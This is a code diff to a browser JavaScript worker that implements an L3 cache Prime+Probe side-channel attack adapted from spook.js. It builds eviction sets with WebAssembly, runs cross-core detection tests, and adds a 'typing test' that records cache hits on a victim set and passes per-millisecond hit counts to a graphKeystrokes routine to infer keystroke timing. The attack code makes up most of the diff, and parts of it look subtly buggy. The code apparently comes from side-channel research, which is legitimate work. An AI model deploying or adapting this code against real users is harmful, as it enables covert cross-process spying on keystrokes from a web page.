@@ -427,48 +427,11 @@ function getCrossFrameAddress() {
     return sendMessage("getCrossFrameAddress");
 }
 
+function graphKeystrokes(data){
+    return sendMessage("graphKeystrokes", data);
+} 
+
 // main();
-
-
-// code adopted from create_spook_js in spook.js 
-async function l3pp_main(options){ 
-    const {module, memory} = await getAccessModules();
-    const buffer = new Uint32Array(memory.buffer);
-
-    // Avoid allocate-on-write optimizations
-    buffer.fill(1);
-    buffer.fill(0);
-
-    await startTimer();
-
-    // Build eviction sets
-    self.importScripts('evsets/main.js');
-
-    let sets = await build_evset({
-        offset: options.offset ?? 63,
-        module: module,
-        memory: memory,
-    });
-
-    let evset = new EvictionListL3(buffer, sets[0]); 
-
-    let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
-    let VICTIM = 27392;
-
-    ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
-    log("detection-rate: " + ipdft_out[0]);
-    log("false-positive-rate: " + ipdft_out[1]);
-
-    /* compute detection rate */
-    let TRANSMIT_ROUNDS_SIDE = 256
-    intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
-
-    // remote_set_profling(evset);
-    log("cross-core attack ready to begin");
-    await sleep(3000);
-    cross_core_test(evset, 128); 
-    await stopTimer();
-}
 
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
@@ -568,4 +531,142 @@ function remote_set_profiling(evset){
     }
 }
 
-l3pp_main({offset:44})
+
+function check_find_all_slices(evset, num_slices){
+    let TRANSMIT_ROUNDS_SIDE = 256;
+    for(let i  = 0; i < 10; i++){
+        for(let j = 0; j < num_slices; j++){
+            evset[j].probe();
+        }
+    }
+    
+    while(true){
+        let count = [0, 0, 0, 0]
+        for(let i = 0; i < TRANSMIT_ROUNDS_SIDE; i++){
+            for(let j = 0; j < TRANSMIT_ROUNDS_SIDE; j++){
+                for(let k = 0; k < num_slices; k++){
+                    count[k] += evset[i].probe();
+                }
+            }
+        }
+        for(let i = 0; i < num_slices; i++){
+            log(i + ": " + count[i] / (TRANSMIT_ROUNDS_SIDE * TRANSMIT_ROUNDS_SIDE))
+        }
+    }
+}
+
+const TARGET_SET = 249;
+const LINE_SIZE = 64;
+const VICTIM = 147008;
+const NUM_SETS_PER_SLICE = 2048;
+const NUM_SLICES = 4;
+const THRESHOLD = 60;
+
+// code adopted from create_spook_js in spook.js 
+async function l3pp_main(options){ 
+    const {module, memory} = await getAccessModules();
+    const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
+    const buffer = new Uint32Array(memory.buffer);
+    let {wasm_hit, wasm_miss} = instance.exports;
+
+    // Avoid allocate-on-write optimizations
+    buffer.fill(1);
+    buffer.fill(0);
+
+    await startTimer();
+
+    // Build eviction sets
+    self.importScripts('evsets/main.js');
+    
+    // let num_sets = 0;
+    // let count = 0;
+    // let found_sets = [] 
+    // while(num_sets < NUM_SLICES){
+    //     let victim = options.victim + (NUM_SETS_PER_SLICE * LINE_SIZE * count);  
+    //     let already_found = false;
+    //     for(let evset of found_sets){
+    //         if(wasm_miss(victim, evset.head * 4)){
+    //             already_found = true;
+    //         }   
+    //     }
+    //     if(!already_found){
+    //                     num_sets++;
+    //         found_sets.push(evset);
+    //     }
+    //     log(victim)
+    //     count++
+    // }
+    //
+    // log("successfully find evsets for all slices")
+    // for(let i = 0; i < found_sets.length; i++){
+    //     log(found_sets[i]);
+    //     found_sets[i].probe();
+    // }
+    
+    let set = await build_evset({
+        offset: options.offset ?? 63,
+        module: module,
+        memory: memory,
+        victim: options.victim 
+    });
+    let evset = new EvictionListL3(buffer, set[0]);
+
+
+    let TRIALS = 250, WARMUP_ROUNDS = 100, THRESHOLD = 60;
+    ipdft_out = intra_process_detection_fp_test(evset, buffer, WARMUP_ROUNDS, TRIALS, VICTIM);
+    log("detection-rate: " + ipdft_out[0]);
+    log("false-positive-rate: " + ipdft_out[1]);
+
+    /* compute detection rate */
+    let TRANSMIT_ROUNDS_SIDE = 256
+    intra_process_transmission_test(evset, buffer, WARMUP_ROUNDS, TRANSMIT_ROUNDS_SIDE, VICTIM);
+
+    cross_core_test(evset, 128); 
+
+    log("typing test begins now")
+    let start_measurement = Math.floor(performance.now());
+    log("start: "+start_measurement)
+    const KEYSTROKE_BUFFER_SIZE = 1024 * 1024;
+    let traces = new Uint8Array(KEYSTROKE_BUFFER_SIZE);
+    traces.fill(0);
+
+    let num_traces = 0;
+
+    for(let i = 0; i < 20; i++){
+        evset.probe();
+    }
+    while(num_traces < KEYSTROKE_BUFFER_SIZE){
+        for(let i = 0; i < 8; i++){
+            let result = evset.probe();
+            traces[num_traces] += (result << i); 
+        }
+        num_traces++;
+    }
+
+    let end_measurement = Math.floor(performance.now());
+    log("end: " + end_measurement)
+    let duration = end_measurement - start_measurement;
+    log("duration: " + duration)
+
+    let NUM_MEASUREMENTS_MS = 1024;
+    let hit_count_per_ms = new Uint16Array(8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS);
+    hit_count_per_ms.fill(0);
+
+    for(let i = 0; i < 8 * KEYSTROKE_BUFFER_SIZE / NUM_MEASUREMENTS_MS; i++){
+        for(let j = 0; j < NUM_MEASUREMENTS_MS / 8; j++){
+            let data = traces[i * NUM_MEASUREMENTS_MS / 8 + j];
+            for(let k = 0; k < 8; k++){
+                let result = data & 1;
+                hit_count_per_ms[i] += result;
+                result >>= 1;
+            }
+        }
+    }
+
+    await graphKeystrokes(hit_count_per_ms);
+
+    remote_set_profiling(evset);
+    await stopTimer();
+}
+
+l3pp_main({offset:(VICTIM - Math.floor(VICTIM/4096) * 4096)/64, victim: VICTIM})
